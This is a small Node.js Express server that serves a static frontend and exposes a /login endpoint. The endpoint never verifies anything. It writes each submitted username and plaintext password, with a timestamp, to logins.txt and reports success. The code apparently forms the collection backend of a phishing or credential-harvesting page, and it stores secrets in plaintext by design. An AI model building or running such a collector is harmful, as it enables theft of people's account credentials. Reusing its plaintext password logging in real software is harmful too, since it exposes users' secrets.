const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static('public')); // serve frontend

app.post('/login', (req, res) => {
  const { username, password } = req.body;

  const entry = { username, password, timestamp: new Date() };
  fs.appendFileSync('logins.txt', JSON.stringify(entry) + '\n');

  res.sendStatus(200);
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
